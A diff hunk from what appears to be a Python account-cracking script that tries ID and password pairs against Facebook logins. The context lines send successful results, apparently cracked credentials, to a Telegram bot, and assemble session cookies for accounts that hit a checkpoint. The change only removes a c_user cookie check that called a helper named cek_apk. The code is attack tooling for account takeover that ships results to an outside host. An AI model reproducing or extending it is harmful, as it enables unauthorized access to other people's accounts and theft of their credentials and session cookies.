@@ -1103,8 +1103,6 @@ def m2(idf,pwv):
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1 
             break
-   if "c_user" in ses.cookies.get_dict().keys():
-            cek_apk(ses, koki)
    elif 'checkpoint' in log_cookies:
            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            coki1 = coki.split("1000")[1]
